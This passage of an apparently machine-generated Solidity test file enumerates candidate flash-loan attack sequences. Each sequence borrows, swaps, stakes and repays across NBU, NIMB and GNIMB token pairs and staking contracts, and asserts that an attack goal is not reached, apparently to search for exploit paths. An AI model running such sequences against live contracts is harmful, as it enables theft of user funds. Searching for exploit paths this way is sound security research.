        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2568(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2569(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2570(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2571(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2572(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2573(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2574(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2575(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2576(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2577(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2578(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2579(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2580(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2581(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2582(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2583(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2584(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2585(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2586(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2587(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2588(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2589(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2590(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2591(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2592(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2593(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2594(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2595(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2596(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2597(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2598(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2599(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2600(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2601(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2602(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2603(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2604(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2605(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2606(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2607(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2608(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2609(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2610(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2611(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2612(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2613(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2614(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2615(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
